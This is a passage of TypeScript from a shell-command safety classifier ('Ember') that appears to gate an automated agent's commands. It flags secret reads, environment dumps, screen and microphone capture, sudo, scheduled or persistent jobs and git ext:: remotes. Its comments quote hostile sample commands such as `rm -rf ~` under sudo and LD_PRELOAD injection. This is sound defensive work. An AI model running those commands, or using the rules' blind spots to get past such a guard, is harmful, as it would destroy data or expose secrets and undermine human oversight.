    if (name !== null && /^[A-Za-z_]\w*$/.test(name)) h.e.loopVars.set(name, plain ?? "for");
    if (name === null || RISKY_ASSIGNMENTS.has(name) || RISKY_ASSIGNMENT_PREFIX.test(name)) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
  }
  // A keyword in front of a command (`then rm x`, `do rm x`): the command after it is classified too.
  if (["then", "elif", "else", "do", "if", "while", "until", "!"].includes(h.key) && h.args.length) h.e.unwrap(h, h.args, h.key);
});
// `!` after a flow word (`if ! grep -q x f`, `then ! LD_PRELOAD=./x.so ls`) only turns round what the command after it
// returns: that command is judged, assignments and all (commands-remote-c1-1).
reg(NATIVE, ["!"], h => { if (h.sc.family === "posix") h.e.unwrap(h, h.args, "!"); else generic(h); });
reg(NATIVE, ["read", "mapfile", "readarray"], h => {
  if (h.s.stdin === null && h.key === "read") h.e.unclear("unclear.interactive", SAYS.interactive);
  // What it reads: its own here-string or here-document, its loop's or if's input, or text Ember can't see, as with
  // `-u`, an option Ember can't see or any other input (judgeReadText, commands-a7-2).
  if (h.sc.family === "posix") {
    const fd = h.args.some(a => a.v === null || /^-[A-Za-z]*u/.test(a.v));
    h.e.noteReadText(fd || h.s.ownInput === undefined || h.s.ownInput === "other" ? "unseen" : h.s.ownInput === "seen" ? "seen" : "closer");
  }
  // The names it sets from each line it reads (`read -r l`; -a, -d, -n, -N, -p, -t, -u, -i take a value).
  if (h.key === "read") {
    // Text it is given itself (`read d <<< ~/.config/ember`): its lines and words (commands-remote-v4-4).
    const given = typeof h.s.stdinText === "string" ? textValues(h.s.stdinText) : h.s.stdinVars?.word ? [h.s.stdinVars.word] : null;
    const names: string[] = [];
    for (let k = 0; k < h.args.length; k++) {
      const v = h.args[k].v;
      if (v === null) continue;
      if (/^-[a-zA-Z]+$/.test(v)) {
        // `-a arr` sets the array arr to the words it reads, as a name after the options is set (commands-y6-1).
        const arr = /a$/.test(v) ? h.args[k + 1]?.v : undefined;
        if (arr && /^[A-Za-z_]\w*$/.test(arr)) { h.e.setVar(arr, given, h.sc, true); names.push(arr); }
        if (/[adnNptui]$/.test(v)) k++;
        continue;
      }
      if (/^[A-Za-z_]\w*$/.test(v)) { h.e.setVar(v, given, h.sc, true); h.e.loopVars.set(v, "read"); names.push(v); }
    }
    h.e.noteRead(names, h.sc);
  } else {
    // mapfile's array (MAPFILE unless named) gets the text it is given, so `"${a[@]}"` is judged where it is used
    // (commands-remote-w5-5); -d, -n, -O, -s, -u, -C and -c take a value.
    const given = typeof h.s.stdinText === "string" ? textValues(h.s.stdinText) : h.s.stdinVars?.word ? [h.s.stdinVars.word] : null;
    let name = "MAPFILE";
    for (let k = 0; k < h.args.length; k++) {
      const v = h.args[k].v;
      if (v === null) break;
      if (/^-[a-zA-Z]+$/.test(v)) { if (/[dnOsuCc]$/.test(v)) k++; continue; }
      if (/^[A-Za-z_]\w*$/.test(v)) name = v;
      break;
    }
    h.e.setVar(name, given, h.sc, true);
  }
  // mapfile's callback (-C) is shell text it runs for every line.
  if (h.key !== "read" && h.args.some(a => a.v !== null && /^-[A-Za-z]*C/.test(a.v))) h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see.");
});
// bash evaluates these as arithmetic or follows them as names, and a subscript in a value runs a command (`a[$(…)]`).
reg(NATIVE, ["let"], h => { h.e.unclear("unclear.arithmetic-command", "Its arithmetic reads a variable whose value could run a command."); });
reg(NATIVE, ["hash"], h => { if (h.args.some(a => a.v !== null && /^-[A-Za-z]*p/.test(a.v))) h.e.unclear("unclear.hash", "It changes which program a name runs."); });

reg(NATIVE, ["command"], h => {
  // command [-pVv] [--] program [args]: only the options before the program are command's own; `command rm -v x`
  // runs rm, while `command -v rm` only says where rm is.
  let k = 0;
  const own: string[] = [];
  for (; k < h.args.length; k++) {
    const v = h.args[k].v;
    if (v === "--") { k++; break; }
    if (v === null || !/^-[A-Za-z]+$/.test(v)) break;
    own.push(v);
  }
  if (own.some(o => o.includes("p"))) { h.e.unclear("unclear.command-p", "Ember can't tell which program this runs."); return; }
  if (own.some(o => /[vV]/.test(o))) return;
  h.e.unwrap(h, h.args.slice(k), "command");
});
reg(NATIVE, ["exec"], h => {
  const p = parseOpts(h.args, { shortValue: "a", stopAtOperand: true });
  h.e.unwrap(h, p.operands, "exec");
});

// The environment: printing it is class d (§3.5.4); env runs a command with assignments.
reg(NATIVE, ["env"], h => {
  // --default-signal, --ignore-signal and --block-signal take a value only after = (commands-remote-i5a); -a (argv0) and
  // a Mac's -P (a search path) take one.
  const spec: OptSpec = { shortValue: "uCSaP", longValue: ["unset", "chdir", "split-string", "argv0"], longOptional: ["default-signal", "ignore-signal", "block-signal"], stopAtOperand: true };
  // Main's table gave the three signal options the next word, so `env --block-signal ls` ran nothing and printed the
  // environment, and knew no -a or -P: judged that way too (commands-held-5).
  const was: OptSpec = { shortValue: "uCS", longValue: ["unset", "chdir", "split-string", "default-signal", "ignore-signal", "block-signal"], stopAtOperand: true };
  const p = heldOpts(h, spec, was);
  if (has(p, "S", "split-string")) { h.e.unclear("unclear.env-split", "Ember can't tell what env -S runs."); return; }
  let k = 0;
  const assigns: { name: string; value: Arg }[] = [];
  while (k < p.operands.length && p.operands[k].v !== null && /^[A-Za-z_][A-Za-z0-9_]*=/.test(p.operands[k].v!)) {
    const v = p.operands[k].v!;
    assigns.push({ name: v.slice(0, v.indexOf("=")), value: lit(v.slice(v.indexOf("=") + 1)) });
    k++;
  }
  if (assigns.length || has(p, "u", "unset", "i") || h.args.some(a => a.v === "-")) h.e.envChanged = true;
  for (const a of assigns) {
    if (RISKY_ASSIGNMENTS.has(a.name) || RISKY_ASSIGNMENT_PREFIX.test(a.name)) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
    // A variable env sets whose value names a command the program runs, as in front of a command (commands-remote-c8-1).
    else if (namesProgram(a.name, a.value.v)) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
  }
  // A Mac's -P looks for the program in those folders, as a PATH assignment does; each is judged as the folder it runs a
  // program from (commands-remote-v5-3).
  for (const dirs of values(p, "P")) {
    h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
    for (const d of dirs === null ? [] : dirs.split(":")) if (d) h.e.usePath(lit(d), "exec", h.sc);
  }
  const rest = p.operands.slice(k);
  if (rest.length === 0) { h.e.add("secret", "secret.env", SAYS.env); return; }
  // Without PWD (`env -i`, `env -`, `env -u PWD`) a shell it starts begins from its folder's real path, and its `cd ..`
  // leaves from there, not from where Ember judged (§3.6, L25).
  if (has(p, "i", "ignore-environment") || h.args.some(a => a.v === "-") || values(p, "u", "unset").some(v => v === null || v === "PWD")) {
    h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
  }
  // `env -C` changes folder as the kernel does (`..` after a link leads beside its target) and leaves PWD naming the old
  // one, so a shell it starts begins from the real path: the folder is unknown to what it runs (as after `cd -P`).
  const cwd = values(p, "C", "chdir").length ? null : h.sc.cwd;
  h.e.unwrap(h, rest, "env", { cwd });
});
// wslvar prints a Windows environment variable (or, with -s/-l, the system's or the user's shell folders).
reg(NATIVE, ["wslvar"], h => {
  for (const a of h.args) if (a.v === null || (!a.v.startsWith("-") && SECRET_VAR.test(a.v))) h.e.add("secret", "secret.env", SAYS.env);
});
reg(NATIVE, ["printenv"], h => {
  const names = h.args.filter(a => !isOption(a));
  if (names.length === 0 || names.some(n => n.v === null || SECRET_VAR.test(n.v))) h.e.add("secret", "secret.env", SAYS.env);
});
reg(NATIVE, ["set"], h => {
  if (h.sc.family === "posix" && h.args.length === 0) h.e.add("secret", "secret.env", SAYS.env);
  // `set -- a b` gives $1, $2… and "$@" their values, as an assignment does: after a `shift` any of them may be any of
  // the words (commands-remote-v4-4).
  if (h.sc.family === "posix") {
    const dashes = h.args.findIndex(a => a.v === "--");
    const from = dashes >= 0 ? dashes + 1 : h.args.findIndex((a, k) => a.v === null || (!/^[-+]/.test(a.v) && !/^[-+]o$/.test(h.args[k - 1]?.v ?? "")));
    if (from >= 0) for (const n of POSITIONAL) h.e.setVar(n, h.args.slice(from), h.sc);
  }
  if (h.sc.family === "posix" && h.args.some(a => a.v === "-o" || a.v === "+o") && h.args.length === 1) h.e.add("secret", "secret.env", SAYS.env);
  // `set -a` (allexport) exports every variable set after it (commands-remote-v5-2); `set +a` stops.
  if (h.sc.family === "posix") {
    for (const [k, a] of h.args.entries()) {
      const v = a.v ?? "";
      if (v === "--") break;
      if ((/^[-+][A-Za-z]*a/.test(v) && !v.startsWith("--")) || ((v === "-o" || v === "+o") && h.args[k + 1]?.v === "allexport")) h.e.allExport = v.startsWith("-");
    }
  }
  // `set -P` / `set -o physical`: every later `cd` follows links, and `cd link; cd ..` lands beside link's target, not
  // where Ember's lexical folder says.
  if (h.sc.family === "posix" && setChases(h.args)) h.e.unclear("unclear.chase-links", CHASE_SAYS);
  // zsh's CDABLE_VARS, by name or (zsh only: bash's -T is functrace) by its letter.
  if (h.sc.family === "posix" && h.args.some(a => a.v !== null && (cdableOption(a.v) || (h.sc.shell === "zsh" && /^-[A-Za-z]*T/.test(a.v))))) {
    h.e.unclear("unclear.cdable-vars", CDABLE_SAYS);
  }
});
reg(NATIVE, ["setopt", "unsetopt"], h => {
  // zsh's option names: any case, underscores ignored, either way round (`setopt CHASE_LINKS`, `unsetopt nochaselinks`);
  // `-w` is CHASE_LINKS's letter, and `-m` makes every name a pattern (`setopt -m 'c*'`).
  if (h.args.some(a => chaseOption(a.v) || /^[-+][A-Za-z]*[wm]/.test(a.v ?? ""))) h.e.unclear("unclear.chase-links", CHASE_SAYS);
  // CDABLE_VARS (-T): `cd x` with no folder x goes to $x, not where Ember judged.
  if (h.args.some(a => a.v !== null && (cdableOption(a.v) || /^[-+][A-Za-z]*T/.test(a.v)))) h.e.unclear("unclear.cdable-vars", CDABLE_SAYS);
});
reg(NATIVE, ["export", "declare", "typeset", "local", "readonly"], h => {
  const p = opts(h);
  const names = p.operands;
  if (names.length === 0 && (h.key === "export" || h.key === "declare" || h.key === "typeset" || has(p, "p", "x"))) { h.e.add("secret", "secret.env", SAYS.env); return; }
  if (has(p, "p") && names.some(n => n.v === null || SECRET_VAR.test(n.v))) h.e.add("secret", "secret.env", SAYS.env);
  if (names.length && !has(p, "p")) h.e.envChanged = true;
  if (has(p, "i", "n")) h.e.unclear("unclear.arithmetic-command", "Its arithmetic reads a variable whose value could run a command.");
  for (const n of names) {
    // An element of one is the variable itself (`declare PATH[0]=/tmp/x` sets PATH; `PATH+=` appends to it).
    const name = (n.v ?? n.raw).split("=")[0].replace(/\[.*$/, "").replace(/\+$/, "");
    if (RISKY_ASSIGNMENTS.has(name) || RISKY_ASSIGNMENT_PREFIX.test(name)) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
    if (n.v !== null && n.v.includes("=") && commandLineSecret(n.v)) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
    // `export d=~/.config/ember` gives d a value as an assignment does (commands-remote-c3-2); `export d` hands the value
    // it has to the programs that run, so it is judged as when it is exported as it is set (commands-remote-v5-2).
    if ((n.v ?? n.raw).includes("=")) h.e.setVar(name, n.v !== null ? [lit(n.v.slice(n.v.indexOf("=") + 1))] : null, h.sc, false, h.key === "export" || has(p, "x"));
    else if (h.key === "export" || has(p, "x")) {
      h.e.useUnjudged([name], true);
      // `CC=./cc.sh; export CC; make`: the value the line gave it is handed to the programs that run, as when it is
      // exported as it is set (commands-classes-y9-5).
      if (h.e.valuesOf(name).some(f => h.e.namesDownload(f, h.sc))) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    }
  }
});
reg(NATIVE, ["compgen"], h => { if (h.args.some(a => /^-[a-zA-Z]*[ev]/.test(a.v ?? ""))) h.e.add("secret", "secret.env", SAYS.env); });

// The clipboard and the screen (§3.5.4).
reg(NATIVE, ["xclip"], h => { if (h.args.some(a => /^-o(ut)?$/.test(a.v ?? ""))) h.e.add("secret", "secret.clipboard", SAYS.clipboard); else h.e.readArgs(h.args.filter(a => !isOption(a) && !/^(primary|secondary|clipboard|c|p|s)$/i.test(a.v ?? "")), h.sc); });
reg(NATIVE, ["xsel"], h => { if (!h.args.some(a => /^(-[a-zA-Z]*[icd]|--input|--clear|--delete|--append|-a)$/.test(a.v ?? ""))) h.e.add("secret", "secret.clipboard", SAYS.clipboard); });
reg(NATIVE, ["ffmpeg", "avconv"], h => {
  const fIdx = h.args.findIndex((a, k) => a.v === "-f" && /^(x11grab|gdigrab|avfoundation|kmsgrab|fbdev|dshow|ddagrab|lavfi)$/i.test(h.args[k + 1]?.v ?? ""));
  if (fIdx >= 0 && /grab|avfoundation|fbdev|dshow/i.test(h.args[fIdx + 1].v ?? "")) h.e.add("secret", "secret.screen", SAYS.screen);
  // A capture device as the input is the microphone or the camera (commands-remote-r9-9): by its format, or by the
  // device's own name.
  if (h.args.some((a, k) => (a.v === "-f" && /^(pulse|alsa|oss|sndio|jack|openal|v4l2|video4linux2?|avfoundation|dshow|vfwcap|decklink|iec61883|libdc1394)$/i.test(h.args[k + 1]?.v ?? ""))
    || (h.args[k - 1]?.v === "-i" && /^\/dev\/(video|dsp|audio|snd)/.test(a.v ?? "")))) h.e.add("secret", "secret.record", SAYS.records);
  const outputs = h.args.filter((a, k) => k === h.args.length - 1 && !isOption(a));
  const inputs = h.args.filter((_a, k) => h.args[k - 1]?.v === "-i").map(a => a);
  h.e.readArgs(inputs, h.sc);
  for (const o of outputs) { const obj = h.e.usePath(o, "write", h.sc); if (obj.abs && h.args.some(a => a.v === "-y")) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); }
});

// Privilege (§3.5.5): the sudo family is class e and the command inside is classified too.
reg(NATIVE, [...SUDO_LIKE], h => {
  const k = h.key;
  const say = SAYS.root;
  if (k === "su" || k === "runuser" || k === "ksu") {
    const p = parseOpts(h.args, { shortValue: "cgGsuw", longValue: ["command", "group", "supp-group", "shell", "user", "whitelist-environment", "session-command"] });
    h.e.add("system", "system.sudo", say, { program: k });
    const text = values(p, "c", "command", "session-command")[0];
    if (text === undefined) {
      const ops = p.operands;
      if (k === "runuser" && h.args.some(a => a.v === "-u")) { const at = h.args.findIndex(a => a.v === "--"); if (at >= 0) h.e.unwrap(h, h.args.slice(at + 1), k); else h.e.unwrap(h, ops, k); return; }
      h.e.unclear("unclear.interactive", SAYS.interactive);
      return;
    }
    if (text === null) { h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see."); return; }
    h.e.nested(text, "sh", h.sc, `${k} -c`);
    return;
  }
  if (k === "runas" && (h.sc.os === "win32" || h.sc.family !== "posix")) {
    h.e.add("system", "system.sudo", say, { program: k });
    const cmd = h.args.filter(a => !(a.v ?? "").startsWith("/")).pop();
    if (cmd && cmd.v !== null) h.e.nested(cmd.v, "cmd", h.sc, "runas");
    else h.e.unclear("unclear.shell-text", "It runs a command Ember can't see.");
    return;
  }
  const spec: OptSpec = {
    // sudo's -h takes a host only attached (alone it is help), and --preserve-env a list only after = (commands-remote-i5a).
    shortValue: k === "sudo" || k === "sudoedit" ? "ugpCUTrtDRca" : k === "doas" ? "uC" : k === "pkexec" ? "u" : "u",
    shortOptional: k === "sudo" || k === "sudoedit" ? "h" : "",
    longValue: ["user", "group", "host", "prompt", "close-from", "other-user", "command-timeout", "role", "type", "chdir", "chroot", "login-class", "auth-type"],
    longOptional: ["preserve-env"],
    stopAtOperand: true,
  };
  // Main's table gave -h and --preserve-env the next word (sudo itself takes a word after a lone -h for the host when a
  // command follows), so `sudo -h host rm -rf ~` was the rm, refused: judged that way too (commands-held-1).
  const was: OptSpec = {
    shortValue: k === "sudo" || k === "sudoedit" ? "ugpCUTrthD" : k === "doas" ? "uC" : "u",
    longValue: ["user", "group", "host", "prompt", "close-from", "other-user", "command-timeout", "role", "type", "chdir", "preserve-env"],
    stopAtOperand: true,
  };
  const p = heldOpts(h, spec, was);
  const other = values(p, "u", "user")[0];
  h.e.add("system", "system.sudo", other && !/^(root|0|#0)$/.test(other) ? `Runs as another user (${other}).` : say, { program: k });
  if (k === "sudoedit" || has(p, "e", "edit")) { objsOf(h, p.operands, "write"); h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (has(p, "b", "background")) h.e.add("escape", "escape.background", SAYS.keepsRunning);
  if (has(p, "l", "list", "v", "validate", "k", "reset-timestamp", "K", "remove-timestamp", "V", "version") && p.operands.length === 0) return;
  if (p.operands.length === 0) { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  // The folder the command runs in, and the one it runs in as its whole disk (-R), judged as a cd to it is
  // (commands-remote-v5-3).
  if (k === "sudo") optionFiles(h, h.args, p, { cd: ["D", "chdir", "R", "chroot"] });
  const dir = values(p, "D", "chdir")[0];
  h.e.unwrap(h, p.operands, k, dir === undefined ? {} : { cwd: dir === null ? null : resolveTargetPath(dir, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd ?? "" }) });
});

// Wrappers with a known option grammar (§3.4.5).
reg(NATIVE, Object.keys(WRAPPERS), h => {
  const rule = WRAPPERS[h.key];
  if (h.key === "timeout" && (h.sc.os === "win32" || h.sc.family !== "posix")) return;
  if (rule.finding) h.e.add(rule.finding.cls, rule.finding.rule, rule.finding.says);
  if (h.key === "disown") return;
  const spec: OptSpec = { shortValue: rule.shortValue ?? "", shortOptional: rule.shortOptional ?? "", longValue: rule.longValue ?? [], stopAtOperand: true };
  // An option after which there is no command is the wrapper's own, before the command: never one of the command's
  // (`ionice -c3 shred -u notes.txt`: commands-remote-r9-14).
  const own = h.args.slice(0, h.args.length - parseOpts(h.args, spec).operands.slice(rule.positional ?? 0).length);
  if (rule.noCommand && own.some(a => a.v !== null && rule.noCommand!.test(a.v))) { h.e.readArgs([], h.sc); return; }
  // A wrapper whose table was corrected since main's is judged by main's too: the word after an option that took a
  // value there was not the command, and what stood after it was (`numactl -H x printenv`: commands-held-5).
  const was: OptSpec = rule.main ? { shortValue: rule.main.shortValue ?? "", longValue: rule.main.longValue ?? [], stopAtOperand: true } : spec;
  const p = heldOpts(h, spec, was);
  let rest = p.operands;
  if (h.key === "nice" && h.args[0]?.v && /^-\d+$/.test(h.args[0].v)) rest = parseOpts(h.args.slice(1), { stopAtOperand: true }).operands;
  if (h.key === "time" || h.key === "strace" || h.key === "ltrace") for (const o of values(p, "o", "output")) if (o) { const obj = h.e.usePath(lit(o), "write", h.sc); if (obj.abs) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); }
  // ltrace -F loads another settings file (commands-remote-v5-3).
  if (h.key === "ltrace") optionFiles(h, h.args, p, { read: ["F"] });
  if ((h.key === "strace" || h.key === "ltrace") && values(p, "p").length) {
    const pids = values(p, "p").flatMap(v => (v ?? "").split(/[ ,]/)).map(Number);
    if (pids.some(n => h.e.ctx.ember.pids.includes(n))) h.e.refuseWith("ember.process", "safety");
    else h.e.add("system", "system.debug", "Watches another program that is running.");
  }
  if (h.key === "strace" && values(p, "u").length) h.e.add("system", "system.sudo", "Runs as another user.");
  rest = rest.slice(rule.positional ?? 0);
  if (rest.length === 0) {
    if (rule.aloneInteractive) h.e.unclear("unclear.interactive", SAYS.interactive);
    return;
  }
  // `exec -c` empties the environment: a shell started so has no PWD and begins from its folder's real path (as env -i).
  if (h.key === "exec" && has(p, "c")) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
  h.e.unwrap(h, rest, h.key);
});
reg(NATIVE, ["flock"], h => {
  const c = h.args.findIndex(a => a.v === "-c" || a.v === "--command");
  if (c >= 0) { const t = h.args[c + 1]?.v; if (t) h.e.nested(t, "sh", h.sc, "flock -c"); else h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see."); return; }
  const p = parseOpts(h.args, { shortValue: "wE", longValue: ["timeout", "conflict-exit-code"], stopAtOperand: true });
  if (p.operands[0]) h.e.usePath(p.operands[0], "write", h.sc);
  h.e.unwrap(h, p.operands.slice(1), "flock");
});
reg(NATIVE, ["firejail", "bwrap", "run-parts", "envdir", "expect"], h => {
  h.e.unclear(`unclear.${h.key}`, h.key === "run-parts" ? "It runs every script in a folder Ember can't see." : SAYS.unclear);
  h.e.readArgs(h.args, h.sc);
});
reg(NATIVE, ["script"], h => {
  // Main's table knew no -m or -o, so the word after one was the file script writes: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: "cEIOBTmo", longValue: ["command", "echo", "log-in", "log-out", "log-io", "log-timing", "logging-format", "output-limit"] }, { shortValue: "cEIOBT", longValue: ["command", "echo", "log-in", "log-out", "log-io", "log-timing", "logging-format", "output-limit"] });
  const c = values(p, "c", "command")[0];
  for (const f of p.operands) { const obj = h.e.usePath(f, "write", h.sc); if (obj.abs && f.v !== "/dev/null") h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); }
  if (c === undefined) { if (h.sc.os === "darwin" && p.operands.length > 1) { h.e.unwrap(h, p.operands.slice(1), "script"); return; } h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (c === null) { h.e.unclear("unclear.shell-text", "It runs shell text Ember can't see."); return; }
  h.e.nested(c, "sh", h.sc, "script -c");
});
reg(NATIVE, ["systemd-run"], h => {
  h.e.add("escape", "escape.systemd-run", SAYS.keepsRunning);
  const p = parseOpts(h.args, {
    shortValue: "upEMH", stopAtOperand: true,
    longValue: ["unit", "property", "description", "slice", "setenv", "machine", "host", "uid", "gid", "nice", "working-directory", "on-active", "on-boot", "on-startup", "on-unit-active", "on-unit-inactive", "on-calendar", "on-clock-change", "on-timezone-change", "timer-property", "path-property", "socket-property", "service-type"],
  });
  if (values(p, "on-calendar", "on-active", "on-boot", "on-startup", "on-unit-active", "on-unit-inactive").length) h.e.add("system", "system.schedule", "Schedules something to run later or at login.");
  if (values(p, "uid", "gid").length || !has(p, "user")) h.e.add("system", "system.sudo", SAYS.root);
  if (values(p, "H", "host", "M", "machine").length) h.e.add("publish", "send.ssh", "Sends data to another computer.");
  h.e.payload(p.operands, h.sc, "systemd-run");
});
/** pm2's and forever's verbs that only list or show what is running. */
const PM_LISTS = new Set(["list", "ls", "l", "ps", "status", "jlist", "prettylist", "logs", "log", "describe", "desc", "show", "info", "id", "pid", "monit", "columns"]);
reg(NATIVE, ["start-stop-daemon", "daemon", "tsp", "pm2", "forever", "supervisord"], h => {
  if (h.key === "pm2" || h.key === "forever") {
    // The verb is the first word that is no option (`pm2 --silent start`, `forever -a start`, and the `--` a package
    // runner passes on), and only a verb known to list, show or stop is no start: `serve`, `deploy`, `install`, a
    // script's name and an option's value read as the verb all ask (commands-classes-y9-1, y9-2).
    const sub = lower(h.args.find(a => a.v === null || !a.v.startsWith("-")));
    if (!sub && h.args.length && h.args.every(a => a.v !== null && /^(-v|-V|-h|--version|--help)$/.test(a.v))) return;
    if (sub && ["stop", "stopall", "delete", "kill", "del"].includes(sub)) { h.e.add("system", "kill.process", "Stops programs that are running."); return; }
    if (sub && PM_LISTS.has(sub)) return;
  }
  h.e.add("escape", `escape.${h.key}`, SAYS.keepsRunning);
});
reg(NATIVE, ["bg"], h => { h.e.add("escape", "escape.background", SAYS.keepsRunning); });
reg(NATIVE, ["at", "batch", "atq", "atrm"], h => {
  if (h.key === "atq") return;
  // Removing jobs is said as such (commands-remote-r1).
  if (h.key === "atrm") { h.e.add("system", "system.unschedule", h.args.filter(a => !isOption(a)).length > 1 ? "Removes scheduled jobs." : "Removes a scheduled job."); return; }
  if (h.args.some(a => a.v === "-l" || a.v === "-c")) return;
  h.e.add("system", "system.schedule", "Schedules something to run later or at login.");
  h.e.add("escape", "escape.schedule", SAYS.keepsRunning);
});
reg(NATIVE, ["crontab"], h => {
  if (h.args.length === 1 && h.args[0].v === "-l") return;
  if (h.args.some(a => a.v === "-e")) h.e.unclear("unclear.interactive", SAYS.interactive);
  // `crontab -r` (or -ir) deletes every job in the crontab, not schedules one (commands-remote-r1).
  if (h.args.some(a => a.v !== null && /^-[a-z]*r[a-z]*$/.test(a.v))) { h.e.add("system", "system.unschedule", "Deletes your scheduled jobs."); return; }
  // `crontab jobs.txt` (`-` or no file: what it's given) replaces every job there with the file's (commands-remote-r1).
  const p = parseOpts(h.args, { shortValue: "u" });
  const file = p.operands[0];
  if (!has(p, "e", "l") && (file !== undefined || h.s.stdin !== null)) {
    const from = file === undefined || file.v === "-" ? "it's given" : `in ${file.v ?? "a file Ember can't name"}`;
    h.e.add("system", "system.schedule", `Replaces your scheduled jobs with the ones ${from}.`);
    return;
  }
  h.e.add("system", "system.schedule", "Schedules something to run later or at login.");
});

// ------------------------------------------------------------------------------------------------------------------
// git (§3.5.1-§3.5.3, §3.4.8, critique security-2, security-8).

const GIT_READ = new Set([
  "status", "diff", "log", "show", "blame", "annotate", "grep", "ls-files", "ls-tree", "ls-remote", "rev-parse", "rev-list", "describe",
  "shortlog", "cherry", "whatchanged", "cat-file", "show-ref", "for-each-ref", "name-rev", "merge-base", "count-objects", "fsck",
  "verify-commit", "verify-tag", "check-ignore", "check-attr", "check-ref-format", "var", "help", "version", "fetch", "pull", "init",
  "merge", "am", "apply", "format-patch", "notes", "remote", "sparse-checkout", "range-diff", "request-pull", "stripspace",
  "interpret-trailers", "column", "show-branch", "get-tar-commit-id", "verify-pack", "diff-tree", "diff-files", "diff-index",
  "hash-object", "update-index", "read-tree", "write-tree", "commit-tree", "mktree", "mktag", "pack-refs", "repack", "index-pack",
  "unpack-objects", "fast-export", "fast-import", "bundle", "rerere", "cherry-pick", "revert", "mv", "restore", "switch", "submodule",
  "worktree", "bisect", "config", "commit", "add", "branch", "checkout", "reset", "stash", "tag", "clean", "rm", "reflog", "gc", "prune",
  "clone", "archive", "push", "send-email", "svn", "p4", "credential", "lfs", "difftool", "mergetool", "gui", "citool", "gitk",
  "instaweb", "daemon", "maintenance", "hook", "filter-branch", "filter-repo", "replace", "update-ref", "symbolic-ref", "merge-file",
  "checkout-index", "rebase", "cvsexportcommit", "credential-store", "credential-cache", "credential-manager", "whatchanged",
  "upload-pack", "receive-pack", "http-backend", "shell", "sh-i18n", "fsmonitor--daemon", "for-each-repo", "scalar", "backfill",
  "replay", "last-modified", "refs", "multi-pack-index", "commit-graph", "prune-packed", "pack-objects", "pack-redundant",
]);

/**
 * A `<helper>::<address>` remote: git runs `git-remote-<helper>` from the command path for it, at once (clone, fetch,
 * ls-remote) or at the next fetch or push once it is set as a remote's address (integ-x-4). `ext::` runs the command
 * the address itself names; any other helper is a program Ember doesn't know. Read only where git takes an address,
 * so a commit message that starts "std::move" is not one.
 */
const GIT_HELPER_ADDRESS = /^[A-Za-z0-9][A-Za-z0-9+.-]*::/;
const GIT_ADDRESS_VERBS = new Set(["remote", "clone", "fetch", "pull", "push", "ls-remote", "submodule", "archive"]);
const GIT_EXT_SAYS = "It runs a program named in a git address.";

/** git settings that say where it fetches from and pushes to, or whether it checks the server (commands-remote-r9-11). */
const GIT_REMOTE_KEYS = /^remote\..+\.(url|pushurl)$|^http\.(.+\.)?(sslverify|sslcainfo|sslcapath|sslcert|sslkey)$|^branch\..+\.(remote|pushremote)$|^remote\.pushdefault$/i;
const GIT_REMOTE_SAYS = "Changes where git fetches from or pushes to, or how it checks the server.";

reg(NATIVE, ["git"], h => {
  const g = globals(h, "git");
  checkGlobals(h, "git", g);
  let sc = h.sc;
  const widen: string[] = [];
  for (const o of g.opts) {
    if (o.name === "-c" || o.name === "--config-env") {
      const key = (o.value ?? "").split("=")[0];
      if (o.value === null || GIT_CODE_KEYS.some(re => re.test(key))) h.e.unclear("unclear.git-config", "Runs code from a git setting.");
    }
    if (o.name === "--exec-path" && o.value !== null) h.e.unclear("unclear.git-exec-path", "Runs git from a folder Ember can't vouch for.");
    if (o.name === "-C") {
      widen.push("-C");
      const cwd = o.value === null ? null : resolveTargetPath(o.value, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
      if (o.value !== null) h.e.usePath(lit(o.value), "cd", sc);
      sc = child(sc, { cwd });
    }
    if (o.name === "--git-dir" || o.name === "--work-tree" || o.name === "--namespace") {
      widen.push(o.name);
      if (o.value) h.e.usePath(lit(o.value), "cd", sc);
    }
  }
  const verbArg = h.args[g.verbAt];
  if (!verbArg) return;
  const verb = verbArg.v;
  if (verb === null) { h.e.unclear("unclear.git-verb", "Ember can't tell which git command this runs."); return; }
  // An `ext::` remote runs the command it names.
  const rest = h.args.slice(g.verbAt + 1);
  if (h.args.some(a => /^ext::/i.test(a.v ?? "")) || (GIT_ADDRESS_VERBS.has(verb) && rest.some(a => GIT_HELPER_ADDRESS.test(a.v ?? "")))) h.e.unclear("unclear.git-ext", GIT_EXT_SAYS);
  const gh: H = { ...h, sc, args: rest, shellSc: h.shellSc ?? h.sc };
  const fn = GIT[verb];
  if (fn) { fn(gh, widen); return; }
  if (!GIT_READ.has(verb)) { h.e.unclear("unclear.git-verb", "Ember can't tell which git command this runs (an alias or an add-on)."); return; }
  h.e.readArgs(rest.filter(a => !isOption(a)), sc);
});

type GitFn = (h: H, widen: string[]) => void;
const GIT: Record<string, GitFn> = {};
const git = (verbs: string[], fn: GitFn): void => { for (const v of verbs) GIT[v] = fn; };
const GIT_BRANCH_OBJ = (a: Arg): Obj => ({ kind: "branch", text: a.v ?? a.raw, abs: null });

git(["push"], (h, widen) => {
  h.e.needsGit = true;
  const p = opts(h, { shortValue: "o", longValue: ["repo", "push-option", "receive-pack", "exec", "recurse-submodules"], longOptional: ["force-with-lease", "signed"] });
  const remote = p.operands[0];
  const refs = p.operands.slice(1);
  const widening = [...widen];
  const flag = (canon: string, ...names: string[]): boolean => { const on = has(p, ...names); if (on && !widening.includes(canon)) widening.push(canon); return on; };
